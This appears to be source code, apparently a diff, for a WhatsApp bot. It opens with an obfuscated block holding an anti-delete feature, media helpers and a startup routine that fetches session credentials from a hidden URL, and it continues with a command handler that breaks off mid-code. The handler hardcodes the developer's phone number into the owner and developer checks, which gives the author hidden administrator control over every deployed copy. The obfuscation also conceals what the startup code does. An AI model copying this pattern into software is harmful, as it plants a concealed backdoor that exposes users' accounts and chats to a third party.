_0x23c65f=_0x484d2e[_0x533847(0x24f)][_0x533847(0x253)][_0x533847(0x25d)],_0x21924e=store['chats'][_0x425b20],_0x5bcee1=_0x21924e[_0x533847(0x1eb)](_0xa06eaf=>_0xa06eaf[_0x533847(0x25d)]['id']===_0x23c65f['id']),_0xb654b2={'key':{'remoteJid':_0x533847(0x22c),'fromMe':![],'participant':_0x533847(0x19f)},'message':{'newsletterAdminInviteMessage':{'newsletterJid':_0x533847(0x196),'newsletterName':_0x533847(0x21e),'jpegThumbnail':null,'caption':'Deleted\x20Message','inviteExpiration':Date[_0x533847(0x1f4)]()+(0x523fba03+0xc46d79e4+-0xaa87a7e7)}}};function _0x5d117e(_0x1a0962){const _0xe997a1=_0x533847,_0x253ddb=_0x1a0962[_0xe997a1(0x25d)][_0xe997a1(0x232)]||_0x1a0962[_0xe997a1(0x25d)]['remoteJid'],_0x5bc7c6=new Intl['DateTimeFormat'](_0xe997a1(0x247),{'timeZone':''+global[_0xe997a1(0x20a)],'dateStyle':_0xe997a1(0x22b),'timeStyle':'medium'})['format'](new Date());let _0x23d105='*[\x20Deleted\x20message\x20DETECTED\x20]*\x0a';return _0x23d105+=_0xe997a1(0x1e5)+_0x5bc7c6+'\x0a',_0x23d105+='*By:*\x20@'+_0x253ddb[_0xe997a1(0x1d1)]('@')[-0x5db*0x3+0x2394+0x1d*-0x9f]+'\x0a',_0x23d105;}if(_0x5bcee1)try{const _0x123380=_0x5d117e(_0x5bcee1),_0x29345f=Object[_0x533847(0x256)](_0x5bcee1[_0x533847(0x24f)])[0x99d*0x2+0xc98+-0x1fd2];if(_0x29345f==='conversation'||_0x29345f===_0x533847(0x244))await _0x130cf2[_0x533847(0x1c3)](_0x130cf2[_0x533847(0x23e)]['id'],{'text':_0x123380+(_0x533847(0x195)+_0x5bcee1[_0x533847(0x24f)][_0x29345f]['text']+_0x533847(0x259)+botname+'.'),'mentions':[_0x5bcee1[_0x533847(0x25d)]['participant']]});else{const _0x5975a8=JSON[_0x533847(0x1a5)](JSON[_0x533847(0x1c0)](_0x5bcee1[_0x533847(0x24f)])),_0x3102ec=Object[_0x533847(0x256)](_0x5975a8)[-0x2384+-0x1*0x3a9+0x272d];_0x5975a8[_0x3102ec]&&(_0x5975a8[_0x3102ec][_0x533847(0x255)]={'stanzaId':_0x5bcee1['key']['id'],'participant':_0x5bcee1[_0x533847(0x22e)],'quotedMessage':_0x5bcee1['message']}),await _0x130cf2[_0x533847(0x1d3)](_0x130cf2[_0x533847(0x23e)]['id'],_0x5975a8,{}),await _0x130cf2[_0x533847(0x1c3)](_0x130cf2['user']['id'],{'fromMe':![],'text':_0x123380,'mentions':[_0x5bcee1[_0x533847(0x25d)][_0x533847(0x232)]]},{'quoted':_0x39256e});}}catch(_0x40adef){console[_0x533847(0x1fb)](_0x533847(0x1e8),_0x40adef);}}}}),_0x130cf2['downloadMediaMessage']=async _0x50f708=>{const _0x12ec96=_0x5e21d6;let _0x51ebac=(_0x50f708[_0x12ec96(0x1b8)]||_0x50f708)[_0x12ec96(0x254)]||'',_0x590bf2=_0x50f708[_0x12ec96(0x1ab)]?_0x50f708[_0x12ec96(0x1ab)][_0x12ec96(0x200)](/Message/gi,''):_0x51ebac['split']('/')[0x2115+0x162d+-0x3742];const _0x45b0bb=await downloadContentFromMessage(_0x50f708,_0x590bf2);let _0x47db98=Buffer[_0x12ec96(0x18c)]([]);for await(const _0x32dec8 of _0x45b0bb){_0x47db98=Buffer[_0x12ec96(0x21b)]([_0x47db98,_0x32dec8]);}return _0x47db98;},_0x130cf2[_0x5e21d6(0x21a)]=async(_0x5bd275,_0x4400b7,_0x546253,_0x406476={})=>{const _0x555dbb=_0x5e21d6;let _0x36a3eb=Buffer[_0x555dbb(0x1a1)](_0x4400b7)?_0x4400b7:/^data:.?\/.?;base64,/i['test'](_0x4400b7)?Buffer[_0x555dbb(0x18c)](_0x4400b7['split']`,`[-0x28a+-0x15e6+0x1871],_0x555dbb(0x239)):/^https?:\/\//[_0x555dbb(0x1a6)](_0x4400b7)?await await getBuffer(_0x4400b7):fs[_0x555dbb(0x192)](_0x4400b7)?fs[_0x555dbb(0x19b)](_0x4400b7):Buffer[_0x555dbb(0x236)](0x703+-0x868+0x165),_0x513a4c;return _0x406476&&(_0x406476[_0x555dbb(0x1c6)]||_0x406476[_0x555dbb(0x1b3)])?_0x513a4c=await writeExifImg(_0x36a3eb,_0x406476):_0x513a4c=await imageToWebp(_0x36a3eb),await _0x130cf2[_0x555dbb(0x1c3)](_0x5bd275,{'sticker':{'url':_0x513a4c},..._0x406476},{'quoted':_0x546253}),_0x513a4c;},_0x130cf2[_0x5e21d6(0x24b)]=async(_0x30c33d,_0x381577,_0x514188,_0x22d216={})=>{const _0x4c3446=_0x5e21d6;let _0x591d54=Buffer['isBuffer'](_0x381577)?_0x381577:/^data:.?\/.?;base64,/i[_0x4c3446(0x1a6)](_0x381577)?Buffer[_0x4c3446(0x18c)](_0x381577[_0x4c3446(0x1d1)]`,`[0xd*0x85+-0x1d94+-0x3*-0x79c],_0x4c3446(0x239)):/^https?:\/\//['test'](_0x381577)?await await getBuffer(_0x381577):fs['existsSync'](_0x381577)?fs[_0x4c3446(0x19b)](_0x381577):Buffer[_0x4c3446(0x236)](-0x1d5f*0x1+-0x2234+0x69*0x9b),_0x47d595;return _0x22d216&&(_0x22d216[_0x4c3446(0x1c6)]||_0x22d216[_0x4c3446(0x1b3)])?_0x47d595=await writeExifVid(_0x591d54,_0x22d216):_0x47d595=await videoToWebp(_0x591d54),await _0x130cf2[_0x4c3446(0x1c3)](_0x30c33d,{'sticker':{'url':_0x47d595},..._0x22d216},{'quoted':_0x514188}),_0x47d595;},_0x130cf2[_0x5e21d6(0x1bf)]=(_0x4831b2,_0x383e89='',_0x59d14e,_0x24da40)=>{const _0x43e783=_0x5e21d6;return Buffer[_0x43e783(0x1a1)](_0x383e89)?this['sendFile'](_0x4831b2,_0x383e89,_0x43e783(0x1bd),'',_0x59d14e,![],_0x24da40):_0x130cf2[_0x43e783(0x1c3)](_0x4831b2,{..._0x24da40,'text':_0x383e89},{'quoted':_0x59d14e,..._0x24da40});},_0x130cf2['sendMedia']=async(_0x2237b9,_0x19edc6,_0x4ff003,_0xba4161={})=>{const _0x45197d=_0x5e21d6;let {ext:_0x3e9eec,mime:_0x113e7a,data:_0x23eb8c}=await _0x130cf2['getFile'](_0x19edc6);return messageType=_0x113e7a[_0x45197d(0x1d1)]('/')[0x1533+0x2198+-0xd*0x437],pase=messageType[_0x45197d(0x200)](_0x45197d(0x1ff),'document')||messageType,await _0x130cf2[_0x45197d(0x1c3)](_0x2237b9,{[''+pase]:_0x23eb8c,'mimetype':_0x113e7a,..._0xba4161},{'quoted':_0x4ff003});},_0x130cf2[_0x5e21d6(0x242)]=async(_0x48387d,_0x5339a9)=>{const _0x3f8098=_0x5e21d6;let _0x11f471,_0x9384b0=Buffer['isBuffer'](_0x48387d)?_0x48387d:/^data:.*?\/.*?;base64,/i[_0x3f8098(0x1a6)](_0x48387d)?Buffer[_0x3f8098(0x18c)](_0x48387d[_0x3f8098(0x1d1)](',')[-0x636*0x6+-0x20de+0x13*0x3b1],'base64'):/^https?:\/\//[_0x3f8098(0x1a6)](_0x48387d)?await(_0x11f471=await getBuffer(_0x48387d)):fs[_0x3f8098(0x192)](_0x48387d)?(filename=_0x48387d,fs[_0x3f8098(0x19b)](_0x48387d)):typeof _0x48387d===_0x3f8098(0x210)?_0x48387d:Buffer[_0x3f8098(0x236)](-0x33e*-0x7+0x1e53+-0x3505),_0x45d279=await FileType[_0x3f8098(0x1b9)](_0x9384b0)||{'mime':_0x3f8098(0x1bc),'ext':_0x3f8098(0x249)};filename=path[_0x3f8098(0x207)](__dirname,'./tmp/'+new Date()['getTime']()+'.'+_0x45d279['ext']);if(_0x9384b0&&_0x5339a9)fs[_0x3f8098(0x20c)][_0x3f8098(0x1c1)](filename,_0x9384b0);return{'res':_0x11f471,'filename':filename,'size':await getSizeMedia(_0x9384b0),..._0x45d279,'data':_0x9384b0};},_0x130cf2['sendFile']=async(_0x8db825,_0x24b5f1,_0x1a00a4='',_0x443fdc='',_0x33aeee,_0xda1221=![],_0x5a1a1c={})=>{const _0x55dc73=_0x5e21d6;let _0x5a1aaa=await _0x130cf2[_0x55dc73(0x242)](_0x24b5f1,!![]),{res:_0x59019a,data:_0x271e14,filename:_0x5dd90c}=_0x5a1aaa;if(_0x59019a&&_0x59019a[_0x55dc73(0x212)]!==-0x1c3c+0x259c+0x113*-0x8||_0x271e14[_0x55dc73(0x1f0)]<=0x2de+0x1*0x89bf+-0x7363*-0x1)try{throw{'json':JSON['parse'](_0x271e14['toString']())};}catch(_0x469cff){if(_0x469cff[_0x55dc73(0x188)])throw _0x469cff[_0x55dc73(0x188)];}let _0x86e76c={'filename':_0x1a00a4};if(_0x33aeee)_0x86e76c['quoted']=_0x33aeee;if(!_0x5a1aaa)_0x5a1a1c[_0x55dc73(0x1ca)]=!![];let _0x1db257='',_0x2a7f74=_0x5a1aaa[_0x55dc73(0x199)],_0x22c515;if(/webp/['test'](_0x5a1aaa['mime'])||/image/[_0x55dc73(0x1a6)](_0x5a1aaa[_0x55dc73(0x199)])&&_0x5a1a1c[_0x55dc73(0x1f9)])_0x1db257=_0x55dc73(0x1d8);else{if(/image/['test'](_0x5a1aaa[_0x55dc73(0x199)])||/webp/[_0x55dc73(0x1a6)](_0x5a1aaa[_0x55dc73(0x199)])&&_0x5a1a1c[_0x55dc73(0x213)])_0x1db257='image';else{if(/video/[_0x55dc73(0x1a6)](_0x5a1aaa[_0x55dc73(0x199)]))_0x1db257=_0x55dc73(0x1df);else{if(/audio/[_0x55dc73(0x1a6)](_0x5a1aaa[_0x55dc73(0x199)]))_0x22c515=await(_0xda1221?toPTT:toAudio)(_0x271e14,_0x5a1aaa[_0x55dc73(0x1d9)]),_0x271e14=_0x22c515['data'],_0x5dd90c=_0x22c515[_0x55dc73(0x20d)],_0x1db257=_0x55dc73(0x1b7),_0x2a7f74=_0x55dc73(0x1ae);else _0x1db257='document';}}}if(_0x5a1a1c[_0x55dc73(0x1ca)])_0x1db257=_0x55dc73(0x197);let _0x23c801={..._0x5a1a1c,'caption':_0x443fdc,'ptt':_0xda1221,[_0x1db257]:{'url':_0x5dd90c},'mimetype':_0x2a7f74},_0x308dcb;try{_0x308dcb=await _0x130cf2[_0x55dc73(0x1c3)](_0x8db825,_0x23c801,{..._0x86e76c,..._0x5a1a1c});}catch(_0xdbe6a8){console['error'](_0xdbe6a8),_0x308dcb=null;}finally{if(!_0x308dcb)_0x308dcb=await _0x130cf2[_0x55dc73(0x1c3)](_0x8db825,{..._0x23c801,[_0x1db257]:_0x271e14},{..._0x86e76c,..._0x5a1a1c});return _0x308dcb;}},_0x130cf2['downloadAndSaveMediaMessage']=async(_0x1bf8ef,_0xe69556,_0x1e2505=!![])=>{const _0x1eb756=_0x5e21d6;let _0x608e13=_0x1bf8ef['m']?_0x1bf8ef['m']:_0x1bf8ef,_0x22402f=(_0x1bf8ef['m']||_0x1bf8ef)['mimetype']||'',_0x28c2db=_0x1bf8ef[_0x1eb756(0x1ab)]?_0x1bf8ef['mtype'][_0x1eb756(0x200)](/Message/gi,''):_0x22402f['split']('/')[0x1*0x1c2e+0x1297*0x1+0xf97*-0x3];const _0x463f2e=await downloadContentFromMessage(_0x608e13,_0x28c2db);let _0x39c325=Buffer[_0x1eb756(0x18c)]([]);for await(const _0x622699 of _0x463f2e){_0x39c325=Buffer['concat']([_0x39c325,_0x622699]);}let _0x413ecf=await FileType[_0x1eb756(0x1b9)](_0x39c325);trueFileName=_0x1e2505?_0xe69556+'.'+_0x413ecf['ext']:_0xe69556;const _0x3425e0='./tmp/';!fs[_0x1eb756(0x192)](_0x3425e0)&&fs[_0x1eb756(0x1c4)](_0x3425e0);const _0xeb3293=_0x3425e0+'/'+trueFileName;return await fs[_0x1eb756(0x1f3)](_0xeb3293,_0x39c325),_0xeb3293;},_0x130cf2;};async function startBot(){const _0x42fc93=_0x3894f6;try{let _0x5e65af=global[_0x42fc93(0x23b)];if(!_0x5e65af['includes'](_0x42fc93(0x201))){console[_0x42fc93(0x1fb)](_0x42fc93(0x257));return;i;}const _0x1e6223=_0x5e65af[_0x42fc93(0x200)](_0x42fc93(0x201),''),{data:_0x3d2085}=await axios[_0x42fc93(0x248)](_0x42fc93(0x18f)+_0x1e6223+_0x42fc93(0x24e));console[_0x42fc93(0x226)](_0x3d2085);const _0x29a485=__dirname+'/tmp/session/creds.json';await fs['writeFileSync'](_0x29a485,_0x3d2085),console[_0x42fc93(0x226)]('Login\x20credentials\x20Saved\x20to',_0x29a485),startBotz();}catch(_0x4a176b){console[_0x42fc93(0x1fb)](_0x42fc93(0x1a4),_0x4a176b);}}startBot();let file=require[_0x3894f6(0x1b2)](__filename);fs[_0x3894f6(0x1ce)](file,()=>{const _0x3be6ab=_0x3894f6;fs['unwatchFile'](file),console[_0x3be6ab(0x226)](_0x3be6ab(0x23f)+__filename),delete require[_0x3be6ab(0x251)][file],require(file);});
+/*
+ * Base By Ednut
+ * Created On 11/10/2024
+ * Contact Me on wa.me/2348102487241
+*/
+
+require('./config')
+const { modul } = require('./lib/module')
+const { util, baileys, chalk, speed } = modul
+const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = baileys
+const { bytesToSize, getRandomFile, smsg, checkBandwidth, sleep, formatSize, getRandom, randomNomor, format, getBuffer, isUrl, jsonformat, nganuin, pickRandom, runtime, shorturl, formatp, fetchJson, color, getGroupAdmins, parseMention } = require("./all/myfunc");
+const { getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture } = require('./all/function.js')
+const api = require('api-dylux')
+const { getDevice } = require('baileys')
+const trlt = require('@vitalets/google-translate-api')
+const cheerio = require('cheerio');
+const BodyForm = require('form-data')
+const FormData = require("form-data")
+const { fromBuffer } = require('file-type');
+const yts = require('youtube-yts')
+const { igdl } = require('btch-downloader');
+const { remini, tiktokDl } = require('./all/lol.js')
+const { randomBytes, crypto } = require('crypto')
+//==========================
+const os = require('os')
+const axios = require('axios')
+const dylux = require('api-dylux')
+const fs = require('fs')
+const path = require('path')
+const moment = require('moment-timezone')
+const {cekArrSave} = require('./lib/arrfunction.js')
+const googleTTS = require('google-tts-api')
+const nou = require("node-os-utils");
+const { LoadDataBase } = require('./lib/message');
+//==========================
+module.exports = ednut = async (ednut, m, chatUpdate, mek, store ) => {
+try {
+await LoadDataBase(ednut, m)
+if(!m)return
+const { type, quotedMsg } = m
+const quoted = m.quoted ? m.quoted : m
+const mime = (quoted.msg || quoted).mimetype || ''
+const body = (m.mtype === 'interactiveResponseMessage') 
+? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id 
+: (m.mtype === 'conversation') 
+? m.message.conversation 
+: (m.mtype === 'imageMessage') 
+? m.message.imageMessage.caption 
+: (m.mtype === 'videoMessage') 
+? m.message.videoMessage.caption 
+: (m.mtype === 'extendedTextMessage') 
+? m.message.extendedTextMessage.text 
+: (m.mtype === 'buttonsResponseMessage') 
+? m.message.buttonsResponseMessage.selectedButtonId 
+: (m.mtype === 'listResponseMessage') 
+? m.message.listResponseMessage.singleSelectReply.selectedRowId 
+: (m.mtype === 'templateButtonReplyMessage') 
+? m.message.templateButtonReplyMessage.selectedId 
+: (m.mtype === 'documentMessage') 
+? m.message.documentMessage.caption 
+: (m.mtype === 'messageContextInfo') 
+? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) 
+: "";
+const budy = (typeof m.text == 'string' ? m.text : '')
+//const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '.' : prefa ?? global.prefix
+// const prefix = prefa[0]
+const prefix = global.prefix;
+// const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
+const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
+const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
+const messagesC = pes.slice(0).trim()
+const content = JSON.stringify(m.message)
+const isCmd2 = !body.startsWith(prefix)
+const isCmd = body.startsWith(prefix)
+const from = m.key.remoteJid
+const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
+const ednutbody = body.startsWith(prefix);      const command = ednutbody ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : "";
+const args = body.trim().split(/ +/).slice(1)
+const text = q = args.join(" ")
+const qmsg = (quoted.msg || quoted)
+const pushname = m.pushName || "No Name"
+const botNumber = await ednut.decodeJid(ednut.user.id)
+const globalelit = `2347036214381@s.whatsapp.net`;
+const isDev  = globalelit.includes(m.sender);
+const archofficail = ['2347036214381@s.whatsapp.net', '2348102487241@s.whatsapp.net']
+const setsudo = JSON.parse(fs.readFileSync("./all/database/owner.json"))
+const isSetsudo = setsudo.includes(m.sender)
+const isOwner = [botNumber, ...owner, global.owner, '2347036214381'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const isGroup = from.endsWith('@g.us')
+const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
+const senderNumber = sender.split('@')[0]
+const groupMetadata = m.isGroup ? await ednut.groupMetadata(m.chat).catch(e => '') : ''
+const groupName = m.isGroup ? groupMetadata.subject : ''
+const participants = m.isGroup ? await groupMetadata.participants : ''
+const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
+const groupOwner = m.isGroup ? groupMetadata.owner : ''
+const groupMembers = m.isGroup ? groupMetadata.participants : ''
+const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
+const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
+const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
+let wlcm = JSON.parse(fs.readFileSync('./all/database/welcome.json'))
+const welcm = m.isGroup ? wlcm.includes(from) : false
+const { util, promisify } = require("util");  
+const isMedia = /image|video|sticker|audio/.test(mime);
+const example = (chat) => {
+return `Usage : *${prefix+command}* ${chat}`
+}
+let ntlink = JSON.parse(fs.readFileSync('./all/database/ntlink.json'))
+const antilink = ntlink.includes(from)
+let ntlink2 = JSON.parse(fs.readFileSync('./all/database/ntlink2.json'))
+const antilink2 = ntlink2.includes(from)
+
+const moment = require('moment-timezone')
+        const time2 = moment().tz("Africa/Lagos").format("HH:mm:ss")
+        let ucapanWaktu;
+
+        if (time2 < "03:00:00") {
+            ucapanWaktu = "Good night🌃"
+        } else if (time2 < "06:00:00") {
+            ucapanWaktu = "Enjoy nap🌆"
+        } else if (time2 < "11:00:00") {
+            ucapanWaktu = "Good morning🏙️"
+        } else if (time2 < "15:00:00") {
+            ucapanWaktu = "Good afternoon🏞️"
+        } else if (time2 < "19:00:00") {
+            ucapanWaktu = "Good afternoon🌄"
+        } else {
+            ucapanWaktu = "Good evening🌃"
+        }
+        const wib = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
+        const wita = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
+        const wit = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
+        const salam2 = moment(Date.now()).tz("Africa/lagos").locale("ng").format("a")
+        
+   
+        
+//chat counter (console log)
+let header = chalk.black(chalk.bgHex("#ff5e78").bold(`\n🌟 ${ucapanWaktu} 🌟`));
+            let title = chalk.white(chalk.bgHex("#4a69bd").bold("🚀 There is a message 🚀"));
+            let date = chalk.cyanBright(`📅 DATE        : ${new Date().toLocaleString()}`);
+            let chatter = chalk.yellowBright(`🗣️ SENDERNAME : ${pushname}`);
+            let jid = chalk.magentaBright(`👤 JIDS       : ${m.sender}`);
+
+            if (isCmd && !m.isGroup) {
+                console.log(header);
+                console.log(title);
+                console.log(date);
+                console.log(chatter);
+                console.log(jid);
+                console.log(chalk.white("------------------------------------------"));
+            } else if (isCmd2 && !m.isGroup) {
+                console.log(header);
+                console.log(title);
+                console.log(date);
+                console.log(chatter);
+                console.log(jid);
+                console.log(chalk.white("------------------------------------------"));
+            } else if (m.isGroup) {
+                let group = chalk.redBright(`🔍 MESS LOCATION : ${groupName}`);
+
+                console.log(header);
+                console.log(title);
+                console.log(date);
+                console.log(chatter);
+                console.log(jid);
+                console.log(group);
+                console.log(chalk.white("------------------------------------------"));
+            }
+
+const thumb = fs.readFileSync ('./tmp/arch.jpg')
+
+const reply4 = async (talk) => {
+   ednut.sendMessage(m.chat, {image: thumb, caption: talk, }, {quoted: m })
+}
+        
+let master = m.isGroup ? owner.includes(mek.key.participant.split('@')[0]) : mek.key.fromMe ? true : owner.includes(mek.key.remoteJid.split('@')[0])
+
+
+
+const createSerial = (size) => {
+return crypto.randomBytes(size).toString('hex').slice(0, size)
+}
+
+const ytdl = require('@vreden/youtube_scraper');
+const { exec, spawn, execSync } = require("child_process")
+const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
+let _cmd = JSON.parse(fs.readFileSync('./all/database/command.json'));
+let _cmdUser = JSON.parse(fs.readFileSync('./all/database/commandUser.json'));
+const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
+
+const timestamp = speed()
+const latensi = speed() - timestamp
+const mark = "0@s.whatsapp.net"
+
+        // Respon Cmd with media
+if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
+let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
+let { text, mentionedJid } = hash
+let messages = await generateWAMessage(m.chat, { text: global.prefix + text, mentions: m.mentionedJid }, {
+    userJid: ednut.user.id,
+    quoted: m.quoted && m.quoted.fakeObj
+})
+messages.key.fromMe = areJidsSameUser(m.sender, ednut.user.id)
+messages.key.id = m.key.id
+messages.pushName = m.pushName
+if (m.isGroup) messages.participant = m.sender
+let msg = {
+    ...chatUpdate,
+    messages: [proto.WebMessageInfo.fromObject(messages)],
+    type: 'append'
+}
+ednut.ev.emit('messages.upsert', msg)
+} 
+
+async function downloadMedia(message, messageType) {
+    try {
+        const stream = await downloadContentFromMessage(message, messageType);
+        let buffer = Buffer.from([]);
+
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk]);
+        }
+
+        return buffer;
+    } catch (error) {
+        console.error("❌ Error downloading media:", error);
+        return null;
+    }
+}
+
+
+
+        //================= {  } =================\\
+        
+        
+        
+if (global.db.settings.autobio) {
+            ednut.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
+        }
+
+
+        // Grup Only
+        if (!m.isGroup && !isOwner && !isSetsudo && global.db.settings.onlygroup) {
+        	if (isCmd){
+            return m.reply(`${global.onlygroup}`)
+            }
+        }
+        // Private Only
+        if (!isOwner && !isSetsudo && global.db.settings.onlypc && m.isGroup) {
+        	if (isCmd){
+	         return m.reply(`${global.onlypc}`)
+	     }
+	}
+	
+	const axios = require('axios')
+const https = require('https')
+const agent = new https.Agent({
+    rejectUnauthorized: true,
+    maxVersion: 'TLSv1.3',
+    minVersion: 'TLSv1.2'
+})
+
+async function getCookies() {
+    try {
+        const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent })
+        const setCookieHeaders = response.headers['set-cookie']
+        if (setCookieHeaders) {
+            const cookies = setCookieHeaders.map(cookieString => {
+                const cookieParts = cookieString.split(';')
+                return cookieParts[0].trim()
+            })
+            return cookies.join('; ')
+        }
+        return null
+    } catch {
+        return null
+    }
+}
+
+
+async function pinterest(query) {
+    try {
+        const cookies = await getCookies()
+        if (!cookies) return []
+
+        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/'
+        const params = {
+            source_url: `/search/pins/?q=${query}`,
+            data: JSON.stringify({
+                options: {
+                    isPrefetch: false,
+                    query: query,
+                    scope: "pins",
+                    no_fetch_context_on_resource: false
+                },
+                context: {}
+            }),
+            _: Date.now()
+        }
+
+        const headers = {
+            'accept': 'application/json, text/javascript, */*, q=0.01',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'en-US,en;q=0.9',
+            'cookie': cookies,
+            'dnt': '1',
+            'referer': 'https://www.pinterest.com/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
+            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
+            'x-app-version': 'c056fb7',
+            'x-pinterest-appstate': 'active',
+            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
+            'x-pinterest-source-url': '/hargr003/cat-pictures/',
+            'x-requested-with': 'XMLHttpRequest'
+        }
+
+        const { data } = await axios.get(url, { httpsAgent: agent, headers, params })
+        return data.resource_response.data.results
+            .filter(v => v.images?.orig)
+            .map(result => ({
+                upload_by: result.pinner.username,
+                fullname: result.pinner.full_name,
+                followers: result.pinner.follower_count,
+                caption: result.grid_title,
+                image: result.images.orig.url,
+                source: "https://id.pinterest.com/pin/" + result.id,
+            }))
+    } catch {
+        return []
+    }
+}
+	
+
+let pp
+try {
+pp = await ednut.profilePictureUrl(m.sender, 'image')
+} catch (err) {
+pp = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
+}
+
+async function webp2mp4File(path) {
+	return new Promise((resolve, reject) => {
+		 const form = new BodyForm()
+		 form.append('new-image-url', '')
+		 form.append('new-image', fs.createReadStream(path))
+		 axios({
+			  method: 'post',
+			  url: 'https://s6.ezgif.com/webp-to-mp4',
+			  data: form,
+			  headers: {
+				   'Content-Type': `multipart/form-data; boundary=${form._boundary}`
+			  }
+		 }).then(({ data }) => {
+			  const bodyFormThen = new BodyForm()
+			  const $ = cheerio.load(data)
+			  const file = $('input[name="file"]').attr('value')
+			  bodyFormThen.append('file', file)
+			  bodyFormThen.append('convert', "Convert WebP to MP4!")
+			  axios({
+				   method: 'post',
+				   url: 'https://ezgif.com/webp-to-mp4/' + file,
+				   data: bodyFormThen,
+				   headers: {
+						'Content-Type': `multipart/form-data; boundary=${bodyFormThen._boundary}`
+				   }
+			  }).then(({ data }) => {
+				   const $ = cheerio.load(data)
+				   const result = 'https:' + $('div#output > p.outfile > video > source').attr('src')
+				   resolve({
+						status: true,
+						message: "© ᴀʀᴄʜ ᴍᴅ ²⁵",
+						result: result
+				   })
+			  }).catch(reject)
+		 }).catch(reject)
+	})
+}
+
+async function tmpfiles(buffer) {
+  const { ext, mime } = (await fromBuffer(buffer)) || {};
+  const form = new BodyForm();
+  form.append("file", buffer, { filename: `tmp.${ext}`, contentType: mime });
+  try {
+    const { data } = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
+      headers: form.getHeaders(),
+    });   
+    //console.log(data);  
+    const match = /https?:\/\/tmpfiles.org\/(.*)/.exec(data.data.url);
+    return `https://tmpfiles.org/dl/${match[1]}`;
+  } catch (error) {
+    throw error;
+  }
+}
+
+
+const isMessage =
+            m.message.conversation ||
+            m.message.extendedTextMessage?.text ||
+            m.message.imageMessage?.caption ||
+            m.message.imageMessage?.url || 
+            m.message.videoMessage?.caption ||
+            m.message.videoMessage?.url ||
+            m.message.stickerMessage?.url ||
+            m.message.documentMessage?.caption ||
+            m.message.documentMessage?.url ||
+            m.message.audioMessage?.url ||
+            m.message.buttonsResponseMessage?.selectedButtonId ||
+            m.message.templateButtonReplyMessage?.selectedId ||
+            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
+            m.message.contactMessage?.displayName || // To handle contact messages
+            m.message.locationMessage?.degreesLatitude ||
+            m.message.pollCreationMessage?.name ||
+            '';
+            
+// antitag function
+
+if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antitag) {
+if (m.mentionedJid.length > 10) {
+if (isOwner || isAdmins || m.key.fromMe) return
